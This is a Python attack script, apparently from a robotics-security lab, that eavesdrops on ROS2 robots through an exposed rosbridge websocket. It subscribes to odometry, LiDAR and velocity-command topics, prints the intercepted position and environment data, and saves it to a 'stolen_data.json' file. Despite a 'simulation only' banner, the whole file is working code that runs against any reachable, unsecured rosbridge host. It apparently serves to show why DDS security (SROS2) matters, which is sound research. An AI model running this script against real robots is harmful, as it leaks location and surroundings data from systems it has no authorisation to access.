#!/usr/bin/env python3
"""
FILE: attack_eavesdropping.py
TYPE: ATTACKER VM Script (runs on ATTACKER VM - Ubuntu in VMware)
PURPOSE: Simulates an eavesdropping attack on ROS2 topics.
         The attacker subscribes to robot sensor topics (/scan, /odom) to
         silently extract robot position, map data, and environment information.
         This demonstrates data leakage without DDS security (SROS2) enabled.

REQUIREMENTS (on Attacker VM):
    pip3 install roslibpy

HOW TO RUN:
    1. Ensure rosbridge is running on HOST: ros2 launch rosbridge_server rosbridge_websocket_launch.xml
    2. On the Attacker VM: python3 attack_eavesdropping.py --host <HOST_IP>
    3. Watch stolen robot data appear in the terminal

ATTACK TYPE: Eavesdropping / Data Exfiltration
"""

import argparse
import time
import json
import sys
import os
from datetime import datetime

try:
    import roslibpy
except ImportError:
    print("[ERROR] roslibpy not installed. Run: pip3 install roslibpy")
    sys.exit(1)


class EavesdroppingAttack:
    def __init__(self, host: str, port: int = 9090, output_file: str = None):
        self.host = host
        self.port = port
        self.client = None
        self.output_file = output_file
        self.stolen_data = []

        if output_file:
            print(f"[ATTACKER] Stolen data will be saved to: {output_file}")

    def connect(self):
        print(f"[ATTACKER] Connecting to {self.host}:{self.port} ...")
        self.client = roslibpy.Ros(host=self.host, port=self.port)
        self.client.run()
        if self.client.is_connected:
            print("[ATTACKER] ✓ Connected! Starting data interception...")
            return True
        print("[ATTACKER] ✗ Connection failed.")
        return False

    def on_odom_received(self, message):
        """Intercept and log odometry (robot position/velocity) data."""
        pos = message.get('pose', {}).get('pose', {}).get('position', {})
        twist = message.get('twist', {}).get('twist', {}).get('linear', {})

        stolen = {
            'timestamp': datetime.now().isoformat(),
            'topic': '/odom',
            'position': {
                'x': round(pos.get('x', 0), 4),
                'y': round(pos.get('y', 0), 4),
                'z': round(pos.get('z', 0), 4),
            },
            'velocity': {
                'linear_x': round(twist.get('x', 0), 4),
            }
        }

        self.stolen_data.append(stolen)
        print(
            f"[STOLEN /odom] Position: x={stolen['position']['x']}, "
            f"y={stolen['position']['y']}  |  "
            f"Velocity: {stolen['velocity']['linear_x']} m/s"
        )

    def on_scan_received(self, message):
        """Intercept LiDAR scan data - reveals environment map."""
        ranges = message.get('ranges', [])
        if ranges:
            valid = [r for r in ranges if r != float('inf') and r == r]
            min_r = round(min(valid), 3) if valid else 'N/A'
            max_r = round(max(valid), 3) if valid else 'N/A'

            stolen = {
                'timestamp': datetime.now().isoformat(),
                'topic': '/scan',
                'num_points': len(ranges),
                'min_range': min_r,
                'max_range': max_r,
                'raw_sample': ranges[:5]  # first 5 range values
            }
            self.stolen_data.append(stolen)
            print(
                f"[STOLEN /scan] {len(ranges)} LiDAR points  |  "
                f"Min dist: {min_r}m  |  Max dist: {max_r}m"
            )

    def on_cmd_vel_received(self, message):
        """Intercept velocity commands - reveals robot intent."""
        lin = message.get('linear', {}).get('x', 0)
        ang = message.get('angular', {}).get('z', 0)
        print(f"[STOLEN /cmd_vel] linear_x={lin:.3f}, angular_z={ang:.3f}")

    def start_eavesdropping(self, duration: float = 30.0):
        """Subscribe to all robot topics and silently log data."""
        print(f"\n[ATTACK] Starting EAVESDROPPING for {duration}s...")
        print("[ATTACK] Intercepting /odom, /scan, /cmd_vel silently\n")

        # Subscribe to odometry
        odom_sub = roslibpy.Topic(self.client, '/odom', 'nav_msgs/Odometry')
        odom_sub.subscribe(self.on_odom_received)

        # Subscribe to LiDAR scan
        scan_sub = roslibpy.Topic(self.client, '/scan', 'sensor_msgs/LaserScan')
        scan_sub.subscribe(self.on_scan_received)

        # Subscribe to command velocity
        cmd_sub = roslibpy.Topic(self.client, '/cmd_vel', 'geometry_msgs/Twist')
        cmd_sub.subscribe(self.on_cmd_vel_received)

        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\n[ATTACKER] Eavesdropping interrupted.")

        # Unsubscribe
        odom_sub.unsubscribe()
        scan_sub.unsubscribe()
        cmd_sub.unsubscribe()

        print(f"\n[ATTACK] Eavesdropping complete. Captured {len(self.stolen_data)} data points.")

        # Save to file if requested
        if self.output_file and self.stolen_data:
            with open(self.output_file, 'w') as f:
                json.dump(self.stolen_data, f, indent=2)
            print(f"[ATTACK] Stolen data saved to {self.output_file}")

    def disconnect(self):
        if self.client and self.client.is_connected:
            self.client.terminate()
            print("[ATTACKER] Disconnected.")


def main():
    parser = argparse.ArgumentParser(
        description='ROS2 Eavesdropping Attack Simulator'
    )
    parser.add_argument('--host', type=str, default='192.168.1.100',
                        help='Host machine IP address')
    parser.add_argument('--port', type=int, default=9090,
                        help='ROS bridge port (default: 9090)')
    parser.add_argument('--duration', type=float, default=30.0,
                        help='Duration to eavesdrop in seconds (default: 30)')
    parser.add_argument('--output', type=str, default='stolen_data.json',
                        help='File to save stolen data (default: stolen_data.json)')
    args = parser.parse_args()

    print("=" * 60)
    print("  ROS2 EAVESDROPPING ATTACK - SIMULATION ONLY")
    print("  For educational/research use in controlled environments")
    print("=" * 60)

    attacker = EavesdroppingAttack(
        host=args.host, port=args.port, output_file=args.output
    )

    if not attacker.connect():
        sys.exit(1)

    try:
        attacker.start_eavesdropping(duration=args.duration)
    finally:
        attacker.disconnect()


if __name__ == '__main__':
    main()
